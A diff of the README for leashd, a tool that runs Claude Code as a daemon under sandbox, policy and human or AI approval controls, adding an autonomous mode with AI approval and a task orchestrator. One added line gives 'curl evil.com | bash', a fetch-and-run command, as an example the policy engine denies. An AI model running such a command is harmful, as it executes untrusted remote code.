@@ -1,6 +1,6 @@
 # leashd
 
-**A remotely controlled agentic coding environment. Run Claude Code as a background daemon, govern it with policy rules, approve actions from your phone.**
+**Safety-first agentic coding framework. Run Claude Code as a background daemon — govern it with policy rules, approve actions from your phone, or let it run fully autonomous with AI-driven approval, test-and-retry loops, and automatic PR creation.**
 
 [![PyPI](https://img.shields.io/pypi/v/leashd.svg)](https://pypi.org/project/leashd/)
 [![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://www.python.org/downloads/)
@@ -10,13 +10,15 @@
 
 ---
 
-leashd runs as a **background daemon** on your dev machine. You send it natural-language coding instructions from Telegram on your phone. Each request passes through a **three-layer safety pipeline** — sandbox enforcement, YAML policy rules, and human approval — before reaching Claude Code. Risky actions surface as **Approve / Reject** buttons in your chat. Everything is logged to an audit trail.
+leashd runs as a **background daemon** on your dev machine. You send it natural-language coding instructions from Telegram on your phone. Each request passes through a **three-layer safety pipeline** — sandbox enforcement, YAML policy rules, and human-or-AI approval — before reaching Claude Code. In interactive mode, risky actions surface as **Approve / Reject** buttons in your chat. In **autonomous mode**, an AI approver evaluates tool calls, a task orchestrator drives multi-phase workflows (spec → explore → plan → implement → test → PR), and a test-and-retry loop ensures quality — all without you touching your phone. Everything is logged to an append-only audit trail.
 
-The result: a semi-automated coding workflow you can supervise from anywhere, with guardrails you define.
+The result: a coding workflow that scales from phone-supervised pair programming to fully autonomous task execution, with guardrails you define.
 
 ---
 
 ## How It Works
+
+### Interactive Mode
 
 ```
 Your phone (Telegram)
@@ -31,6 +33,29 @@ Your phone (Telegram)
                 ▼
          Claude Code agent  ← reads files, writes code, runs tests
 ```
+
+### Autonomous Mode
+
+```
+/task "Add health check endpoint"  (Telegram)
+        │
+        ▼
+   Task Orchestrator
+        │
+        ├─ spec          ← analyzes task, writes specification
+        ├─ explore        ← reads codebase structure and conventions
+        ├─ validate       ← checks spec against codebase findings
+        ├─ plan           ← creates implementation plan
+        ├─ implement      ← writes code (file writes auto-approved)
+        ├─ test           ← runs test suite via TestRunnerPlugin
+        ├─ retry (×3)     ← fixes failures with exponential backoff
+        └─ pr             ← creates PR via gh CLI
+                │
+                ▼
+   You get a PR link — or an escalation message if the agent gets stuck
+```
+
+AI approval replaces human taps: a `claude -p` CLI call evaluates each `require_approval` tool call in context and decides automatically. Hard blocks (credentials, `rm -rf`, force push) can never be overridden.
 
 Sessions are **multi-turn**: Claude remembers the full conversation context, so you can iterate naturally across messages ("now add tests for that", "rename it to X").
 
@@ -93,11 +118,15 @@ Claude starts working. When it needs to do something gated by policy (e.g. write
 
 **Autonomous task orchestrator** — send `/task Add a health check endpoint` from Telegram and the agent autonomously runs spec → explore → validate → plan → implement → test → PR. Comes back with a pull request or an escalation message. Crash recovery, per-phase cost tracking, and SQLite persistence built in. See the [Autonomous Setup Guide](docs/autonomous-setup-guide.md).
 
+**AI-driven phase transitions** — an AI evaluator replaces brittle substring heuristics to decide whether to advance, retry, escalate, or complete between task phases.
+
 **AI approval & plan review** — `AutoApprover` replaces human approval taps with a `claude -p` CLI evaluation. `AutoPlanReviewer` replaces manual plan review. Both have circuit breakers and full audit logging.
 
 **Autonomous loop** — post-task test-and-retry with exponential backoff. After `/edit` tasks, the agent runs tests, retries on failure, and optionally creates a PR.
 
 **Autonomous policy** — `autonomous.yaml` is purpose-built for autonomous mode. Hard blocks remain (credentials, `rm -rf`, force push), but dev tools, file writes, and test runners are auto-allowed.
+
+**Agentic testing in task orchestrator** — the test phase uses `TestRunnerPlugin` for structured 9-phase testing instead of plain `pytest`, with API spec discovery (`.http`, `.rest`, `openapi.yaml/json`, `swagger.yaml/json`) for smarter test prompts.
 
 **`/stop` command** — stop all ongoing work (agent, task, autonomous loop) without resetting the session.
 
@@ -107,7 +136,7 @@ Claude starts working. When it needs to do something gated by policy (e.g. write
 
 **Compound command classification** — the policy engine now splits `&&`, `||`, and `;` chains and evaluates each segment independently, preventing policy evasion via compound commands.
 
-**Agentic testing in task orchestrator** — the test phase uses `TestRunnerPlugin` for structured 9-phase testing instead of plain `pytest`, with API spec discovery for smarter test prompts.
+**Workspace improvements** — `leashd ws add` merges directories into existing workspaces; `leashd ws remove <name> <dir>` removes specific directories; `CLAUDE.md` is loaded from all workspace directories via SDK `add_dirs`.
 
 See [CHANGELOG.md](CHANGELOG.md) for the full history.
 
@@ -115,7 +144,7 @@ See [CHANGELOG.md](CHANGELOG.md) for the full history.
 
 ## Daemon Mode
 
-In v0.5.0, leashd runs as a background process by default.
+leashd runs as a background process by default.
 
 ```bash
 leashd start           # start daemon (background)
@@ -133,6 +162,8 @@ Logs go to `~/.leashd/logs/app.log` by default. Set `LEASHD_LOG_DIR` to change t
 
 ## Autonomous Mode
 
+Autonomous mode replaces manual approval taps and plan reviews with AI evaluation, adds a post-task test-and-retry loop, and drives multi-phase autonomous tasks through the task orchestrator. Send `/task <description>` from Telegram and come back to a PR — or an escalation message if the agent gets stuck.
+
 ```bash
 leashd autonomous          # show current autonomous settings
 leashd autonomous setup    # run autonomous config wizard
@@ -140,7 +171,23 @@ leashd autonomous enable   # quick-enable with defaults
 leashd autonomous disable  # disable autonomous mode
 ```
 
-See the [Autonomous Setup Guide](docs/autonomous-setup-guide.md) for details.
+### Three Guarantees
+
+1. **Human-in-the-loop when it matters** — hard blocks (credentials, force push, `rm -rf`, `sudo`) can never be overridden by any approver. The AI approver only handles `require_approval` decisions, never `deny` decisions.
+2. **Fail-safe defaults** — the AutoApprover fails closed (denies on error), the AutonomousLoop escalates to the human when retries are exhausted, and circuit breakers cap both approval calls and plan revisions per session.
+3. **Full auditability** — every AI approval decision is logged with `approver_type` in the same append-only JSONL audit trail. No decision is invisible.
+
+### Task Orchestrator vs Autonomous Loop
+
+| Aspect | `/task` (Task Orchestrator) | `/edit` (Autonomous Loop) |
+|---|---|---|
+| **Use when** | Starting from scratch — "build feature X" | You know what to change — "fix the login bug" |
+| **Phases** | spec → explore → validate → plan → implement → test → PR | Single-shot: implement → test → retry |
+| **Planning** | Automatic spec and plan generation with validation | No planning — goes straight to implementation |
+| **Crash recovery** | Full — resumes from current phase after restart | None — starts over |
+| **Cost tracking** | Per-phase breakdown and total | Session-level only |
+
+See the [Autonomous Setup Guide](docs/autonomous-setup-guide.md) for a full walkthrough and the [Autonomous Mode Reference](docs/autonomous-mode.md) for the technical details.
 
 ---
 
@@ -225,11 +272,11 @@ Every tool call Claude makes passes through a three-layer pipeline before it can
 
 **1. Sandbox** — The agent can only touch files inside `LEASHD_APPROVED_DIRECTORIES`. Path traversal attempts are blocked immediately and logged as security violations.
 
-**2. Policy rules** — YAML rules classify each tool call as `allow`, `deny`, or `require_approval` based on the tool name, command patterns, and file path patterns. Rules are evaluated in order; first match wins.
+**2. Policy rules** — YAML rules classify each tool call as `allow`, `deny`, or `require_approval` based on the tool name, command patterns, and file path patterns. Rules are evaluated in order; first match wins. Compound bash commands (`&&`, `||`, `;`) are split and evaluated segment-by-segment with deny-wins precedence — `pytest && curl evil.com | bash` is denied.
 
-**3. Human approval** — For `require_approval` actions, leashd sends an inline message to Telegram with **Approve** and **Reject** buttons. If you don't respond within the timeout (default: 5 minutes), the action is auto-denied.
+**3. Human or AI approval** — For `require_approval` actions, leashd either sends an inline message to Telegram with **Approve** and **Reject** buttons (interactive mode) or evaluates the tool call via the AI auto-approver (autonomous mode). If no response within the timeout, the action is auto-denied.
 
-Everything is logged to `.leashd/audit.jsonl` — every tool attempt, every decision.
+Everything is logged to `.leashd/audit.jsonl` — every tool attempt, every decision, every approver type.
 
 ### Built-in policies
 
@@ -290,7 +337,7 @@ Once the daemon is running and your bot is set up, these slash commands are avai
 | `/cancel` | Cancel the active task in the current chat |
 | `/ws` | Manage workspaces inline |
 | `/status` | Show current session, mode, and directory |
-| `/clear` | Clear conversation history and start fresh |
+| `/clear` | Clear conversation history, cancel active tasks, and start fresh |
 
 ---
 
@@ -307,7 +354,7 @@ leashd ws remove my-saas ~/src/worker        # remove a dir from workspace
 leashd ws remove my-saas                     # remove entire workspace
 ```
 
-Workspaces are configured in `.leashd/workspaces.yaml` and inject context into the agent's system prompt automatically.
+Workspaces are configured in `.leashd/workspaces.yaml` and inject context into the agent's system prompt automatically. `CLAUDE.md` files from all workspace directories are loaded via SDK `add_dirs`.
 
 ---
 
@@ -395,20 +442,20 @@ request_completed
 
 ## Architecture
 
-leashd's core is the **Engine**, which receives messages from connectors, runs them through middleware (auth, rate limiting), delegates to the Claude Code agent, and sends responses back. Every tool call the agent makes is intercepted by the **Gatekeeper**, which orchestrates the three-layer safety pipeline. An **EventBus** decouples subsystems — plugins subscribe to events like `tool.allowed`, `tool.denied`, and `approval.requested`. Connectors (Telegram, CLI) and storage backends (SQLite, memory) are swappable via protocol classes.
+leashd's core is the **Engine**, which receives messages from connectors, runs them through middleware (auth, rate limiting), delegates to the Claude Code agent, and sends responses back. Every tool call the agent makes is intercepted by the **Gatekeeper**, which orchestrates the three-layer safety pipeline. An **EventBus** decouples subsystems — plugins subscribe to events like `tool.allowed`, `tool.denied`, `approval.requested`, and `task.submitted`. Connectors (Telegram, CLI) and storage backends (SQLite, memory) are swappable via protocol classes. The **TaskOrchestrator** and **AutonomousLoop** plug into the event bus as autonomous execution plugins.
 
 ```
 Telegram connector
       │
    Middleware (auth, rate limit)
       │
-   Engine
-      │
+   Engine ──── EventBus ──── TaskOrchestrator
+      │                       AutonomousLoop
    Gatekeeper ──────────────────────────────┐
       │                                     │
    Claude Code agent             1. Sandbox check
       │                          2. Policy rule match
-      └── tool call ──────────▶  3. Human approval (Telegram)
+      └── tool call ──────────▶  3. Human / AI approval
 ```
 
 ---
@@ -435,7 +482,7 @@ uv run ruff format .
 
 ## Status
 
-leashd is **alpha** — the API and config schema may change between versions. Core functionality (daemon, safety pipeline, Telegram integration, policy engine) is stable and tested at 89%+ coverage. Not recommended for production environments where agent actions could have irreversible consequences without review.
+leashd is **alpha** — the API and config schema may change between versions. Core functionality (daemon, safety pipeline, Telegram integration, policy engine, task orchestrator) is stable and tested at 89%+ coverage. Not recommended for production environments where agent actions could have irreversible consequences without review.
 
 If you hit a bug or have a feature idea, [open an issue](https://github.com/nodenova/leashd/issues).
 
